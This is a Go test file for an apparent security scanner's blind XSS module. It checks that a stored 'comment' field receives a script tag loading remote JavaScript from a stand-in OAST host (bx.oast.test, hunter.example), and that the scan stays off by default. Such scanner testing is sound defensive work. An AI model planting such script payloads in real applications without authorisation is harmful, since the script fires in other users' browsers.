package blind_xss_oast

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/modules/modtest"
	"github.com/vigolium/vigolium/pkg/oast/oastclass"
)

func TestMain(m *testing.M) { modtest.VerifyNoLeaks(m) }

type fakeOAST struct {
	mu       sync.Mutex
	enabled  bool
	src      string
	classes  []oastclass.Class
	recorded []string
}

func (f *fakeOAST) GenerateURLFor(cls oastclass.Class, target, param, label, moduleID, reqHash string) string {
	f.mu.Lock()
	f.classes = append(f.classes, cls)
	f.mu.Unlock()
	return "bx.oast.test"
}
func (f *fakeOAST) GenerateURL(string, string, string, string, string) string { return "bx.oast.test" }
func (f *fakeOAST) RecordPayload(_, payload string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.recorded = append(f.recorded, payload)
}
func (f *fakeOAST) Enabled() bool         { return true }
func (f *fakeOAST) BlindXSSEnabled() bool { return f.enabled }
func (f *fakeOAST) BlindXSSSrc() string   { return f.src }

func bodyRecorder(t *testing.T) (*httptest.Server, func() []string) {
	var mu sync.Mutex
	var bodies []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		bodies = append(bodies, string(b)+"|UA="+r.UserAgent())
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(srv.Close)
	return srv, func() []string { mu.Lock(); defer mu.Unlock(); return append([]string(nil), bodies...) }
}

// TestPlantsCorrelatedScript covers the blind XSS consumer: with blind XSS
// enabled, a stored body value gets a script tag pointing at a minted
// oastclass.BlindXSS host, recorded for the finding.
func TestPlantsCorrelatedScript(t *testing.T) {
	srv, bodies := bodyRecorder(t)
	oast := &fakeOAST{enabled: true}
	rr := modtest.RequestMethod(t, http.MethodPost, srv.URL+"/feedback", "comment=hello")
	res, err := New().ScanPerInsertionPoint(rr, modtest.InsertionPoint(t, rr, "comment"), modtest.Requester(t), &modkit.ScanContext{OASTProvider: oast})
	require.NoError(t, err)
	assert.Empty(t, res)

	got := bodies()
	require.Len(t, got, 1)
	assert.Contains(t, got[0], "bx.oast.test")
	assert.Contains(t, strings.ToLower(got[0]), "script")
	oast.mu.Lock()
	defer oast.mu.Unlock()
	assert.Equal(t, []oastclass.Class{oastclass.BlindXSS}, oast.classes)
	require.Len(t, oast.recorded, 1)
	assert.Contains(t, oast.recorded[0], `<script src="https://bx.oast.test/b.js">`)
}

// TestOffByDefault: blind XSS leaves a payload in the target's data that fires
// in someone else's browser, so nothing is sent unless the operator enabled it.
func TestOffByDefault(t *testing.T) {
	srv, bodies := bodyRecorder(t)
	rr := modtest.RequestMethod(t, http.MethodPost, srv.URL+"/feedback", "comment=hello")
	_, err := New().ScanPerInsertionPoint(rr, modtest.InsertionPoint(t, rr, "comment"), modtest.Requester(t), &modkit.ScanContext{OASTProvider: &fakeOAST{}})
	require.NoError(t, err)
	assert.Empty(t, bodies())
}

// TestExternalSrc: an operator hunter src (oast.blind_xss_src) is planted as-is;
// no correlated host is minted.
func TestExternalSrc(t *testing.T) {
	srv, bodies := bodyRecorder(t)
	oast := &fakeOAST{enabled: true, src: "https://hunter.example/x.js"}
	rr := modtest.RequestMethod(t, http.MethodPost, srv.URL+"/feedback", "comment=hello")
	_, err := New().ScanPerInsertionPoint(rr, modtest.InsertionPoint(t, rr, "comment"), modtest.Requester(t), &modkit.ScanContext{OASTProvider: oast})
	require.NoError(t, err)
	got := bodies()
	require.Len(t, got, 1)
	assert.Contains(t, got[0], "hunter.example")
	assert.Empty(t, oast.classes, "an external src mints no correlated host")
}
